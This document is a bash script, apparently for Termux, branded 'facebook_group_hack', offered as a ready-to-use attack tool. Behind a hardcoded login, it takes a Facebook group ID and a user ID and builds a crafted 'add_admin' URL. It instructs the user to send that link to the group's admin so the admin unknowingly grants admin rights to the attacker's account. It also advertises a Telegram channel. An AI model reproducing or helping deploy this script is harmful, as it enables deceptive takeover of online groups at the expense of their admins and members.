pkg install figlet
clear
echo -e "\e[1;34m _   _  ___  ____ _____ ______   __"
echo -e "\e[1;35m| | | |/ _ \/ ___|_   _|  _ \ \ / /"
echo -e "\e[1;36m| |_| | | | \___ \ | | | |_) \ V /"
echo -e "\e[1;35m|  _  | |_| |___) || | |  _ < | |"
echo -e "\e[1;34m|_| |_|\___/|____/ |_| |_| \_\|_|"
echo -e "\e[1;31m              facebook_group_hack\e[1;0m"
echo -e "\e[1;33mTELEGTAM: http://t.me/hostryhack"
echo -e "\e[1;32mpress enter to continu"
read yd
if [ yd = 0 ];then
echo ""
else
clear
echo -e "\e[1;32m "
figlet HOSTRY
echo -e "\e[1;31m               facebook_group_hack\e[1;0m"
echo -e "\e[1;33mpress 1 to LOGIN"
echo -e "\e[1;33mpress 2 to UPDATE\e[1;0m"
echo -e "\e[1;33mpress 3 to EXIT\e[1;0m"
read num
if [ $num = 2 ]
then
pkg install git
git clone *************
echo -e "\e[1;32mDONE"
fi
if [ $num = 3 ]
then
echo -e "\e[1;32mThank you for using my script\e[1;0m"
exit
fi
if [ $num = 1 ]
then
echo -e "\e[1;31mUSERNAME: \e[1;0m"
read USER
if [ $USER = HOSTRY ]
then
echo -e "\e[1;31mPASSWORD: \e[1;0m"
read PASS
if [ $PASS = 122333 ]
then
echo -e "\e[1;34mFacebook \e[1;33mGroup \e[1;31mId:"
read GID
fi
echo -e "\e[1;34mFacebook \e[1;33mUser \e[1;31mId:"
read ID
echo -e "\e[1;34mMAKE URL"
echo -e "\e[1;33mWAIT.."
sleep 1
echo -e "\e[1;32mTHE URL:"
echo -e "\e[1;34mhttps://m.facebook.com/group/add_admin/?group_id=$GID&user_id=$ID&added&_rdrChange"
echo "https://m.facebook.com/group/add_admin/?group_id=$GID&user_id=$ID&added&_rdrChange" > link.txt
echo -e "\e[1;31mCopy The Link And Send IT To The \e[1;34mAdmin Of The Group"
else
echo -e "\e[1;31mFOSLE INFORMATION"
xdg-open http://t.me/hostryhack
fi

else
echo -e "\e[1;31mFOLSE INFORMATIIN"
xdg-open http://t.me/hostryhack

fi
fi

